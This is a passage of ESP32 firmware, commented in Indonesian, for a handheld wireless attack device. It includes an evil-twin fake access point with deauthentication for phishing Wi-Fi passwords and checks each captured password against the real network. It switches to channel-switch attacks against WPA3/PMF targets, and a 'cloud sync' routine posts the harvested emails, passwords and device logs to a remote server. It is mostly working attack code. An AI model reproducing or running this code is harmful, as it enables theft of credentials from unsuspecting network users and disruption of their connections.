  void onResult(BLEAdvertisedDevice d) {
    String mac = String(d.getAddress().toString().c_str());
    int8_t rssi = d.getRSSI();
    String name = d.haveName() ? String(d.getName().c_str()) : String("");

    for (int i = 0; i < g_bleScanCount; i++) {
      if (strcmp(g_bleScanLog[i].mac, mac.c_str()) == 0) {
        g_bleScanLog[i].rssi = rssi;
        g_bleScanLog[i].lastSeen = millis();
        if (name.length() > 0) {
          strncpy(g_bleScanLog[i].name, name.c_str(), 32);
          g_bleScanLog[i].name[32] = 0;
        }
        return;
      }
    }
    if (g_bleScanCount < BLE_SCAN_MAX) {
      BleScanEntry* e = &g_bleScanLog[g_bleScanCount];
      strncpy(e->mac, mac.c_str(), 17);
      e->mac[17] = 0;
      strncpy(e->name, name.c_str(), 32);
      e->name[32] = 0;
      e->rssi = rssi;
      e->lastSeen = millis();
      e->used = true;
      g_bleScanCount++;
    }
  }
};

BLEScan* g_bleScan = nullptr;

void drawBleScan() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("BLE SCANNER", TFT_BLUE);
  tft.setTextFont(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setCursor(4, 28);
  tft.print("MAC               RSSI  NAME");

  int shown = 0;
  for (int i = 0; i < g_bleScanCount && shown < 4; i++) {
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(4, 40 + shown * 18);
    char buf[64];
    const char* bname = g_bleScanLog[i].name[0] ? g_bleScanLog[i].name : vendorFromMacStr(g_bleScanLog[i].mac);
    snprintf(buf, sizeof(buf), "%s  %4d  %s",
             g_bleScanLog[i].mac, g_bleScanLog[i].rssi, bname);
    tft.print(buf);
    shown++;
  }
  if (g_bleScanCount == 0) {
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.setCursor(4, 50);
    tft.print("Menunggu perangkat BLE...");
  }
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(4, 108);
  tft.print("Total: " + String(g_bleScanCount));
  drawFooter("TOMBOL = STOP");
}

void startBLEScan() {
  WiFi.mode(WIFI_OFF);
  if (!BLEDevice::getInitialized()) BLEDevice::init("");
  g_bleScan = BLEDevice::getScan();
  g_bleScan->setAdvertisedDeviceCallbacks(new BleScanCallbacks());
  g_bleScan->setActiveScan(true);
  g_bleScan->setInterval(100);
  g_bleScan->setWindow(99);
  g_bleScanCount = 0;
  g_bleScanStart = millis();
  g_bleScan->start(0, false);
  g_bleScanning = true;
  Serial.println("[BLE] Scanner aktif");
  drawBleScan();
}

void stopBLEScan() {
  if (g_bleScan) g_bleScan->stop();
  g_bleScanning = false;
  BLEDevice::deinit(true);
  resetWifiStateAfterAttack();
  Serial.println("[BLE] Scanner berhenti");
}

// ------------------------------------------------------------------
// Cloud Sync (kirim hasil ke hosting)
// ------------------------------------------------------------------
String buildSyncJson() {
  String mac = WiFi.macAddress();
  String j = "{\"device\":\"NISKALA\",\"mac\":\"" + mac + "\",\"uptime\":" + String(millis() / 1000) + ",";

  // probe log
  j += "\"probe\":[";
  portENTER_CRITICAL(&g_probeLogMux);
  int cnt = g_probeLogCount;
  int head = g_probeLogHead;
  ProbeEntry snap[PROBE_LOG_SIZE];
  for (int i = 0; i < cnt; i++) {
    int idx = (head - cnt + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
    snap[i] = g_probeLog[idx];
  }
  portEXIT_CRITICAL(&g_probeLogMux);
  for (int i = 0; i < cnt; i++) {
    if (i) j += ",";
    char m[18];
    snprintf(m, sizeof(m), "%02X:%02X:%02X:%02X:%02X:%02X",
             snap[i].mac[0], snap[i].mac[1], snap[i].mac[2],
             snap[i].mac[3], snap[i].mac[4], snap[i].mac[5]);
    String ssid = snap[i].ssid[0] ? String(snap[i].ssid) : String("(hidden)");
    j += "{\"mac\":\"" + String(m) + "\",\"rssi\":" + String(snap[i].rssi) + ",\"ssid\":\"" + jsonEscape(ssid) + "\"}";
  }
  j += "],";

  // karma
  j += "\"karma\":[";
  for (int i = 0; i < g_karmaSSIDCount; i++) {
    if (i) j += ",";
    j += "{\"ssid\":\"" + jsonEscape(String(g_karmaSSIDs[i].ssid)) + "\",\"probe_count\":" + String(g_karmaSSIDs[i].probeCount) + ",\"auth_count\":" + String(g_karmaSSIDs[i].authCount) + "}";
  }
  j += "],";

  // passwords
  int total = prefs.getInt("pwd_count", 0);
  j += "\"passwords\":[";
  for (int i = 0; i < total; i++) {
    String entry = prefs.getString(("pwd_" + String(i)).c_str(), "");
    int p1 = entry.indexOf('|');
    String email = (p1 > 0) ? entry.substring(0, p1) : entry;
    String rest = (p1 > 0) ? entry.substring(p1 + 1) : "";
    int p2 = rest.indexOf('|');
    String pass = (p2 > 0) ? rest.substring(0, p2) : rest;
    String ver = (p2 > 0) ? rest.substring(p2 + 1) : "";
    if (i) j += ",";
    j += "{\"email\":\"" + jsonEscape(email) + "\",\"password\":\"" + jsonEscape(pass) + "\",\"verified\":\"" + ver + "\"}";
  }
  j += "],\"ble\":[\n";
  for (int i = 0; i < g_bleScanCount; i++) {
    if (i) j += ",";
    j += "{\"mac\":\"" + String(g_bleScanLog[i].mac) + "\",\"name\":\"" + jsonEscape(String(g_bleScanLog[i].name)) + "\",\"rssi\":" + String(g_bleScanLog[i].rssi) + "}";
  }
  j += "]}";
  return j;
}

void startCloudSync() {
  g_cloudPhase = CLOUD_PHASE_IDLE;
  tft.fillScreen(TFT_BLACK);
  drawHeader("CLOUD SYNC", TFT_DARKCYAN);
  tft.setTextFont(2);

  if (cfg_wifi_ssid.length() == 0 || cfg_server_url.length() == 0) {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(10, 40); tft.println("Belum dikonfigurasi.");
    tft.setCursor(10, 60); tft.println("Isi WiFi & URL di");
    tft.setCursor(10, 80); tft.println("Web Remote > Config.");
    g_cloudPhase = CLOUD_PHASE_DONE;
    g_cloudTimer = millis();
    return;
  }

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 40); tft.print("WiFi: "); tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println(cfg_wifi_ssid.substring(0, 16));
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 60); tft.print("URL : "); tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println(cfg_server_url.substring(0, 30));
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(10, 85); tft.print("Menghubungkan...");

  WiFi.mode(WIFI_STA);
  WiFi.begin(cfg_wifi_ssid.c_str(), cfg_wifi_pass.c_str());
  Serial.printf("[SYNC] Connect %s ...\n", cfg_wifi_ssid.c_str());
  g_cloudPhase = CLOUD_PHASE_CONNECTING;
  g_cloudTimer = millis();
}

void cloudSyncTick() {
  if (g_cloudPhase == CLOUD_PHASE_CONNECTING) {
    if (WiFi.status() == WL_CONNECTED) {
      g_cloudPhase = CLOUD_PHASE_SENDING;
      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.setCursor(10, 105); tft.print("Connected. Mengirim...");
      Serial.println("[SYNC] Connected");
    } else if (millis() - g_cloudTimer > 12000) {
      Serial.println("[SYNC] GAGAL konek WiFi");
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setCursor(10, 105); tft.println("GAGAL konek WiFi");
      WiFi.disconnect();
      WiFi.mode(WIFI_STA);
      g_cloudPhase = CLOUD_PHASE_DONE;
      g_cloudTimer = millis();
    }
  } else if (g_cloudPhase == CLOUD_PHASE_SENDING) {
    String json = buildSyncJson();
    HTTPClient http;
    http.begin(cfg_server_url);
    http.addHeader("Content-Type", "application/json");
    http.addHeader("X-API-Key", SYNC_API_KEY);
    http.setTimeout(6000);
    int code = http.POST(json);
    String resp = http.getString();
    http.end();
    Serial.printf("[SYNC] HTTP %d: %s\n", code, resp.c_str());

    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.fillRect(0, 105, 240, 12, TFT_BLACK);
    tft.setCursor(10, 105);
    if (code == 200) { tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println("SUKSES kirim data"); }
    else { tft.setTextColor(TFT_RED, TFT_BLACK); tft.println("FAIL HTTP " + String(code)); }

    WiFi.disconnect();
    WiFi.mode(WIFI_STA);
    g_cloudPhase = CLOUD_PHASE_DONE;
    g_cloudTimer = millis();
  } else if (g_cloudPhase == CLOUD_PHASE_DONE) {
    if (millis() - g_cloudTimer > 2500) {
      g_cloudPhase = CLOUD_PHASE_IDLE;
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
}

void restoreOriginalApMac() {
  if (g_originalApMac[0] != 0 || g_originalApMac[1] != 0 || g_originalApMac[2] != 0 ||
      g_originalApMac[3] != 0 || g_originalApMac[4] != 0 || g_originalApMac[5] != 0) {
    esp_wifi_set_mac(WIFI_IF_AP, g_originalApMac);
  }
}

void resetWifiStateAfterAttack() {
  esp_wifi_set_promiscuous(false);
  WiFi.softAPdisconnect(true);
  restoreOriginalApMac();
  WiFi.mode(WIFI_STA);
}

// Hentikan serangan tanpa memutus AP kontrol Web Remote
void stopAttacksKeepWebRemote() {
  if (isDeauthRunning) { isDeauthRunning = false; esp_wifi_set_promiscuous(false); }
  if (isBeaconRunning) isBeaconRunning = false;
  if (isAuthFloodRunning) isAuthFloodRunning = false;
  if (isGlobalDeauthRunning) isGlobalDeauthRunning = false;
  if (isProbeRunning) { isProbeRunning = false; esp_wifi_set_promiscuous(false); }
  if (isBTSpamRunning) { btSpamStop(); isBTSpamRunning = false; }
  if (isCSARunning) { isCSARunning = false; esp_wifi_set_promiscuous(false); }
  if (isKarmaRunning) { isKarmaRunning = false; esp_wifi_set_promiscuous(false); }
  if (isEvilTwinRunning) {
    isEvilTwinRunning = false;
    isReleasing = false;
    isVerifying = false;
    verifyState = 0;
    server.stop();
    dnsServer.stop();
    esp_wifi_set_promiscuous(false);
  }
  g_attackMode = ATK_IDLE;
}

// Hentikan semua modul serangan tanpa merusak AP kontrol saat idle
void stopAllAttacks() {
  if (isDeauthRunning) stopDeauthEngine();
  if (isBeaconRunning) stopBeaconSpam();
  if (isAuthFloodRunning) stopAuthFlood();
  if (isGlobalDeauthRunning) stopGlobalDeauth();
  if (isProbeRunning) stopProbeSniffer();
  if (isBTSpamRunning) stopBTSpam();
  if (isCSARunning) stopCSAAttack();
  if (isKarmaRunning) stopKarmaScan();
  if (isEvilTwinRunning) {
    isEvilTwinRunning = false;
    isReleasing = false;
    isVerifying = false;
    verifyState = 0;
    verifyAttempts = 0;
    server.stop();
    dnsServer.stop();
    resetWifiStateAfterAttack();
  }
  g_attackMode = ATK_IDLE;
}

// ── Evil Twin  [PATCH 5 MAC cloning] ──
void stopEvilTwin();

String getBestDiscoveredSSID() {
  String best = "";
  int bestCount = 0;

  portENTER_CRITICAL(&g_probeLogMux);
  for (int i = 0; i < g_probeLogCount; i++) {
    int idx = (g_probeLogHead - g_probeLogCount + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
    if (g_probeLog[idx].ssid[0] != 0 && (int)g_probeLog[idx].count > bestCount) {
      best = String(g_probeLog[idx].ssid);
      bestCount = g_probeLog[idx].count;
    }
  }
  portEXIT_CRITICAL(&g_probeLogMux);

  for (int i = 0; i < g_karmaSSIDCount; i++) {
    if (g_karmaSSIDs[i].ssid[0] != 0 && (int)g_karmaSSIDs[i].probeCount > bestCount) {
      best = String(g_karmaSSIDs[i].ssid);
      bestCount = g_karmaSSIDs[i].probeCount;
    }
  }
  return best;
}

void startEvilTwinWithDeauth() {
  WiFi.mode(WIFI_AP_STA);
  delay(100);
  restoreOriginalApMac();

  String safeSSID = targetSSID;
  if (safeSSID.length() == 0) {
    safeSSID = getBestDiscoveredSSID();
    if (safeSSID.length() == 0) {
      safeSSID = "Free_WiFi";
    } else {
      Serial.printf("[EVIL TWIN] SSID hidden -> pakai hasil Probe/Karma: %s\n", safeSSID.c_str());
    }
  }

  bool apSuccess = WiFi.softAP(safeSSID.c_str(), NULL, g_targetChannel, 0, 4);
  if (!apSuccess) {
    Serial.println("[ERROR] Gagal membuat AP Palsu!");
    stopEvilTwin();
    currentState = MAIN_MENU;
    drawMainMenu();
    return;
  }
  delay(250);

  uint8_t fakeMac[6];
  esp_wifi_get_mac(WIFI_IF_AP, fakeMac);
  Serial.printf("[EVIL TWIN] Fake AP: SSID=%s MAC=%02X:%02X:%02X:%02X:%02X:%02X ch=%d\n",
                safeSSID.c_str(),
                fakeMac[0], fakeMac[1], fakeMac[2], fakeMac[3], fakeMac[4], fakeMac[5],
                g_targetChannel);

  IPAddress IP = WiFi.softAPIP();
  dnsServer.start(DNS_PORT, "*", IP);
  server.begin();

  applyPromiscuousFilter(false);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);

  g_packetsSent = 0;
  g_txErrors = 0;
  g_victimFound = false;
  isReleasing = false;
  isVerifying = false;
  isEvilTwinRunning = true;
  g_attackMode = ATK_EVIL_TWIN;
  evilTwinStartTime = millis();

  Serial.printf("Evil Twin Started. Target BSSID=%02X:%02X:%02X:%02X:%02X:%02X ch=%d (attempt %d/%d)\n",
                g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
                g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
                g_targetChannel,
                verifyAttempts + 1, MAX_VERIFY_ATTEMPTS);
}
void stopEvilTwin() {
  isEvilTwinRunning = false;
  isReleasing = false;
  isVerifying = false;
  verifyState = 0;
  useCustomTemplate = false;
  g_attackMode = ATK_IDLE;
  server.stop();
  dnsServer.stop();
  resetWifiStateAfterAttack();
}

// ═══════════════════════════════════════════════
// PMF detection
// ═══════════════════════════════════════════════
// ------------------------------------------------------------------
// Deteksi PMF (802.11w) presisi via parsing RSN capabilities beacon
// ------------------------------------------------------------------
volatile bool g_pmfFound = false;
volatile bool g_pmfEnabled = false;
uint8_t g_pmfBSSID[6] = {0};

void pmfCaptureCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  uint16_t sig_len = pkt->rx_ctrl.sig_len;
  if (sig_len < 24) return;

  uint8_t subtype = (p[0] >> 4) & 0x0F;
  if (subtype != 0x08) return; // beacon
  if (memcmp(&p[16], g_pmfBSSID, 6) != 0) return;

  int pos = 36; // 24 header + 12 fixed params
  while (pos + 2 <= sig_len) {
    uint8_t eid = p[pos];
    uint8_t len = p[pos + 1];
    if (pos + 2 + len > sig_len) break;

    if (eid == 0x30) { // RSN IE
      int d = pos + 2;
      int dlen = len;
      if (dlen >= 8) {
        uint16_t pcount = p[d + 6] | (p[d + 7] << 8);
        int off = d + 8 + pcount * 4;
        if (off + 2 <= d + dlen) {
          uint16_t acount = p[off] | (p[off + 1] << 8);
          off += 2 + acount * 4;
          if (off + 2 <= d + dlen) {
            uint16_t caps = p[off] | (p[off + 1] << 8);
            g_pmfEnabled = (caps & 0x00C0) != 0; // bit 6 = capable, bit 7 = required
            g_pmfFound = true;
          }
        }
      }
      break;
    }
    pos += 2 + len;
  }
}

bool detectPMFExact(const uint8_t* bssid, uint8_t channel) {
  g_pmfFound = false;
  g_pmfEnabled = false;
  memcpy(g_pmfBSSID, bssid, 6);

  WiFi.mode(WIFI_AP_STA);
  delay(50);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(50);

  wifi_promiscuous_filter_t filter;
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(pmfCaptureCb);
  esp_wifi_set_promiscuous(true);

  unsigned long start = millis();
  while (!g_pmfFound && (millis() - start) < 1500) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) break;
    delay(10);
  }

  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_STA);
  return g_pmfEnabled;
}

bool detectPMF(int idx) {
  wifi_ap_record_t records[32];
  uint16_t count = 32;
  if (esp_wifi_scan_get_ap_records(&count, records) != ESP_OK) return false;
  if (idx >= count) return false;

  wifi_auth_mode_t m = records[idx].authmode;
  if (m == WIFI_AUTH_WPA3_PSK || m == WIFI_AUTH_WPA2_WPA3_PSK) return true;

  // WPA2 bisa tetap aktif PMF (802.11w) -> deteksi presisi dari beacon RSN
  uint8_t bssid[6];
  memcpy(bssid, records[idx].bssid, 6);
  return detectPMFExact(bssid, records[idx].primary);
}

// ═══════════════════════════════════════════════
// Verification
// ═══════════════════════════════════════════════
void beginVerification() {
  isReleasing = false;
  isVerifying = true;
  verifyState = 1;
  verifyStart = millis();
  Serial.printf("[VERIFY] Attempt %d/%d starting\n",
                verifyAttempts + 1, MAX_VERIFY_ATTEMPTS);
  esp_wifi_set_promiscuous(false);
  g_attackMode = ATK_IDLE;
  WiFi.disconnect();
  delay(100);
  WiFi.begin(targetSSID.c_str(), capturedPass.c_str(), g_targetChannel, g_targetBSSID);
}

void updateVerification() {
  if (!isVerifying) return;

  if (WiFi.status() == WL_CONNECTED) {
    verificationResult = true;
    WiFi.disconnect();
    updatePasswordVerification(true);
    isVerifying = false;
    verifyAttempts = 0;
    verifyState = 2;
    releaseAfterSuccess = millis() + SUCCESS_HOLD_MS;
    Serial.println("[VERIFY] PASSWORD BENAR");
    return;
  }

  if (millis() - verifyStart > VERIFY_TIMEOUT_MS) {
    WiFi.disconnect();
    updatePasswordVerification(false);
    isVerifying = false;
    verifyAttempts++;

    Serial.printf("[VERIFY] Attempt %d/%d FAILED\n",
                  verifyAttempts, MAX_VERIFY_ATTEMPTS);

    if (verifyAttempts >= MAX_VERIFY_ATTEMPTS) {
      verifyState = 0;
      verifyAttempts = 0;
      stopEvilTwin();
      tft.fillScreen(TFT_BLACK);
      drawHeader("MAX PERCOBAAN", TFT_RED);
      tft.setTextFont(2); tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setCursor(10, 40); tft.println("5x password salah.");
      tft.setCursor(10, 60); tft.println("Target dilepas.");
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.setCursor(10, 85); tft.println("Kembali ke menu...");
      transientActive = true;
      transientUntil = millis() + 2500;
      transientMode = 1;
      return;
    }

    verifyState = 3;
    isReleasing = false;
    esp_wifi_set_promiscuous(true);
    g_attackMode = ATK_EVIL_TWIN;

    tft.fillScreen(TFT_BLACK);
    drawHeader("PASSWORD SALAH", TFT_RED);
    tft.setTextFont(2); tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(10, 40); tft.println("Password salah.");
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setCursor(10, 62);
    tft.print("Percobaan: "); tft.print(verifyAttempts);
    tft.print("/"); tft.println(MAX_VERIFY_ATTEMPTS);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, 85); tft.println("Target input ulang...");
    transientActive = true;
    transientUntil = millis() + 1500;
    transientMode = 2;
    return;
  }
}

// ═══════════════════════════════════════════════
// Navigation
// ═══════════════════════════════════════════════
void startClientMonitor();
void stopClientMonitor();
void drawClientMonitor();
void startNetworkRecon();
void stopNetworkRecon();

void handleAPListNavigation() {
  if (digitalRead(BTN_TOP) == LOW) {
    delay(200);
    selectedIdx++;
    if (selectedIdx > apCount) selectedIdx = 0;
    drawAPList();
  }
  if (digitalRead(BTN_BOTTOM) == LOW) {
    delay(200);
    if (selectedIdx == apCount) {
      currentState = MAIN_MENU; drawMainMenu();
    } else {
      memcpy(g_targetBSSID, WiFi.BSSID(selectedIdx), 6);
      g_targetChannel = WiFi.channel(selectedIdx);
      targetSSID = WiFi.SSID(selectedIdx);

      if (currentState == RECON_AP_SELECT) {
        g_reconSelectedAuth = (int)WiFi.encryptionType(selectedIdx);
        currentState = RECON;
        startNetworkRecon();
        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
        return;
      }

      if (currentState == AP_LIST_CLIENT) {
        currentState = CLIENT_MONITOR_RUNNING;
        startClientMonitor();
        drawClientMonitor();
        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
        return;
      }
      if (currentState == AP_LIST_CSA) {
        currentState = CSA_RUNNING;
        startCSAAttack();
        drawCSARunning(0);
        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
        return;
      }
      // [PATCH 2] PMF terdeteksi → tawarkan CSA
      if (detectPMF(selectedIdx)) {
        tft.fillScreen(TFT_BLACK);
        drawHeader("TARGET PMF/WPA3", TFT_ORANGE);
        tft.setTextFont(2); tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.setCursor(10, 30); tft.println("Target pakai PMF/WPA3.");
        tft.setCursor(10, 48); tft.println("Deauth TIDAK berhasil.");
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.setCursor(10, 70); tft.println("Gunakan CSA Attack —");
        tft.setCursor(10, 88); tft.println("tembus PMF via beacon");
        tft.setCursor(10, 106); tft.println("channel switch sah.");
        drawFooter("ATAS=Batal | BAWAH=CSA");

        while (digitalRead(BTN_TOP) != LOW && digitalRead(BTN_BOTTOM) != LOW) delay(50);
        delay(300);

        if (digitalRead(BTN_BOTTOM) == LOW) {
          currentState = CSA_RUNNING;
          startCSAAttack();
          drawCSARunning(0);
          while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
        } else {
          currentState = MAIN_MENU;
          drawMainMenu();
        }
        return;
      }
      if (currentState == AP_LIST_DEAUTH) {
        currentState = DEAUTH_MENU;
        startDeauthEngine();
        drawDeauthMenu();
      } else if (currentState == AP_LIST_EVIL_TWIN) {
        currentState = TEMPLATE_SELECT;
        templateSelection = 0;
        drawTemplateSelect();
      } else if (currentState == AP_LIST_AUTH_FLOOD) {
        currentState = AUTH_FLOOD_RUNNING;
        startAuthFlood();
        drawAuthFlood(0);
      }
    }
  }
}

void startFetchCustomTemplate() {
  g_tplPhase = TPL_PHASE_IDLE;
  if (cfg_template_url.length() == 0 || cfg_wifi_ssid.length() == 0) {
    useCustomTemplate = false;
    selectedTemplateIdx = 0;
    currentState = EVIL_TWIN_RUNNING;
    verifyAttempts = 0;
    verifyState = 0;
    startEvilTwinWithDeauth();
    drawEvilTwinRunning(0);
    return;
  }

  tft.fillScreen(TFT_BLACK);
  drawHeader("AMBIL TEMPLATE", TFT_DARKCYAN);
  tft.setTextFont(2);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 40); tft.println("Mengambil template");
  tft.setCursor(10, 60); tft.println("dari hosting...");

  WiFi.mode(WIFI_STA);
  WiFi.begin(cfg_wifi_ssid.c_str(), cfg_wifi_pass.c_str());
  g_tplPhase = TPL_PHASE_CONNECTING;
  g_tplTimer = millis();
}

void templateFetchTick() {
  if (g_tplPhase == TPL_PHASE_CONNECTING) {
    if (WiFi.status() == WL_CONNECTED) {
      g_tplPhase = TPL_PHASE_GETTING;
    } else if (millis() - g_tplTimer > 12000) {
      WiFi.disconnect();
      WiFi.mode(WIFI_STA);
      useCustomTemplate = false;
      selectedTemplateIdx = 0;
      currentState = EVIL_TWIN_RUNNING;
      verifyAttempts = 0;
      verifyState = 0;
      startEvilTwinWithDeauth();
      drawEvilTwinRunning(0);
      return;
    }
  } else if (g_tplPhase == TPL_PHASE_GETTING) {
    HTTPClient http;
    http.begin(cfg_template_url);
    http.setTimeout(6000);
    int code = http.GET();
    bool ok = false;
    if (code == 200) {
      g_customTemplate = http.getString();
      ok = g_customTemplate.length() > 0;
    }
    http.end();
    WiFi.disconnect();
    WiFi.mode(WIFI_STA);

    if (ok) {
      selectedTemplateIdx = 5;
      useCustomTemplate = true;
    } else {
      useCustomTemplate = false;
      selectedTemplateIdx = 0;
    }

    currentState = EVIL_TWIN_RUNNING;
    verifyAttempts = 0;
    verifyState = 0;
    startEvilTwinWithDeauth();
    drawEvilTwinRunning(0);
  }
}
void handleTemplateSelect() {
  if (digitalRead(BTN_TOP) == LOW) {
    delay(200);
    templateSelection = (templateSelection + 1) % TEMPLATE_COUNT;
    drawTemplateSelect();
  }
  if (digitalRead(BTN_BOTTOM) == LOW) {
    delay(200);
    if (templateSelection == 5) {
      currentState = FETCH_TEMPLATE;
      startFetchCustomTemplate();
      while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
      return;
    } else {
      selectedTemplateIdx = templateSelection;
      useCustomTemplate = false;
      currentState = EVIL_TWIN_RUNNING;
      verifyAttempts = 0;
      verifyState = 0;
      startEvilTwinWithDeauth();
      drawEvilTwinRunning(0);
    }
  }
}

void handleKarmaResults() {
  if (digitalRead(BTN_TOP) == LOW) {
    delay(200);
    karmaSelection++;
    if (karmaSelection > g_karmaSSIDCount) karmaSelection = 0;
    if (karmaSelection >= karmaScrollPos + 4) karmaScrollPos = karmaSelection - 3;
    else if (karmaSelection < karmaScrollPos) karmaScrollPos = karmaSelection;
    drawKarmaResults();
  }
  if (digitalRead(BTN_BOTTOM) == LOW) {
    delay(200);

    if (karmaSelection >= g_karmaSSIDCount) {
      karmaSelection = 0;
      karmaScrollPos = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
      return;
    }

    String selectedSSID = String(g_karmaSSIDs[karmaSelection].ssid);
    int probes = g_karmaSSIDs[karmaSelection].probeCount;
    Serial.printf("[KARMA] Selected: %s (%d probes)\n", selectedSSID.c_str(), probes);

    tft.fillScreen(TFT_BLACK);
    drawHeader("MENCARI AP ASLI...", TFT_ORANGE);
    tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 50);
    tft.print("SSID: "); tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.println(selectedSSID.substring(0, 20));
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setCursor(10, 80); tft.println("Scanning...");

    uint8_t foundBSSID[6] = {0};
    uint8_t foundChannel = 1;
    bool found = false;

    delay(100);
    int n = WiFi.scanNetworks(false, true);
    for (int i = 0; i < n; i++) {
      if (WiFi.SSID(i) == selectedSSID) {
        memcpy(foundBSSID, WiFi.BSSID(i), 6);
        foundChannel = WiFi.channel(i);
        found = true;
        break;
      }
    }

    memcpy(g_targetBSSID, foundBSSID, 6);
    g_targetChannel = foundChannel;
    targetSSID = selectedSSID;

    if (found) {
      Serial.printf("[KARMA] Found AP: BSSID=%02X:%02X:%02X:%02X:%02X:%02X ch=%d\n",
                    g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
                    g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
                    g_targetChannel);
    } else {
      Serial.printf("[KARMA] AP not found — Evil Twin without deauth target\n");
    }

    verifyAttempts = 0;
    verifyState = 0;
    currentState = EVIL_TWIN_RUNNING;
    startEvilTwinWithDeauth();
    drawEvilTwinRunning(0);
  }
}

void doScanAnimation() {
  tft.fillScreen(TFT_BLACK);
  drawScanAnimation(0);
  WiFi.scanNetworks(true, true);
  int frame = 0;
  while (true) {
    int n = WiFi.scanComplete();
    if (n >= 0) { apCount = n; break; }
    if (n == -2) { apCount = 0; break; }
    drawScanAnimation(frame++);
    if (digitalRead(BTN_TOP) == LOW) {
      WiFi.scanDelete(); apCount = -1; delay(200); break;
    }
    delay(60);
  }
}

void startApScan(int pendingMenu) {
  g_scanPendingMenu = pendingMenu;
  g_scanFrame = 0;
  g_scanLastDraw = 0;
  currentState = AP_SCANNING;
  tft.fillScreen(TFT_BLACK);
  drawScanAnimation(0);
  WiFi.scanNetworks(true, true);
}

void apScanTick() {
  int n = WiFi.scanComplete();
  if (n >= 0) {
    apCount = n;
    int menu = g_scanPendingMenu;
    g_scanPendingMenu = -1;
    if (menu == 0) { currentState = AP_LIST_DEAUTH; }
    else if (menu == 1) { currentState = AP_LIST_EVIL_TWIN; }
    else if (menu == 5) { currentState = AP_LIST_AUTH_FLOOD; }
    else if (menu == 9) { currentState = AP_LIST_CSA; }
    else if (menu == 15) { currentState = AP_LIST_CLIENT; }
    else if (menu == 16) { currentState = RECON_AP_SELECT; }
    else { currentState = MAIN_MENU; }
    selectedIdx = 0; apScrollPos = 0;
    if (apCount > 0) drawAPList();
    else {
      tft.fillScreen(TFT_BLACK);
      drawHeader("NO WIFI FOUND", TFT_RED);
      delay(1500);
      drawMainMenu();
      currentState = MAIN_MENU;
    }
  } else if (n == -2) {
    apCount = 0;
    g_scanPendingMenu = -1;
    currentState = MAIN_MENU;
    drawMainMenu();
  } else if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
    WiFi.scanDelete();
    apCount = -1;
    g_scanPendingMenu = -1;
    delay(200);
    currentState = MAIN_MENU;
    drawMainMenu();
  } else if (millis() - g_scanLastDraw > 60) {
    drawScanAnimation(g_scanFrame++);
    g_scanLastDraw = millis();
  }
}

// ═══════════════════════════════════════════════
// Disclaimer
// ═══════════════════════════════════════════════
void showDisclaimerFlow() {
  while (true) {
    drawDisclaimerScreen(tft, "v" FW_VERSION);
    while (digitalRead(BTN_TOP) != LOW && digitalRead(BTN_BOTTOM) != LOW) delay(50);
    delay(300);
    drawConfirmationScreen(tft);
    bool cancelled = false;
    while (true) {
      if (digitalRead(BTN_TOP) == LOW) { delay(300); cancelled = true; break; }
      if (digitalRead(BTN_BOTTOM) == LOW) { delay(300); break; }
      delay(50);
    }
    if (!cancelled) return;
  }
}

// ═══════════════════════════════════════════════
// Setup
// ═══════════════════════════════════════════════
// ------------------------------------------------------------------
// Macro / Attack Sequence
// ------------------------------------------------------------------
enum MacroAction {
  MACT_NONE = 0,
  MACT_BEACON,
  MACT_GLOBAL_DEAUTH,
  MACT_PROBE,
  MACT_KARMA,
  MACT_BT_SPAM
};

struct MacroStep {
  uint8_t action;
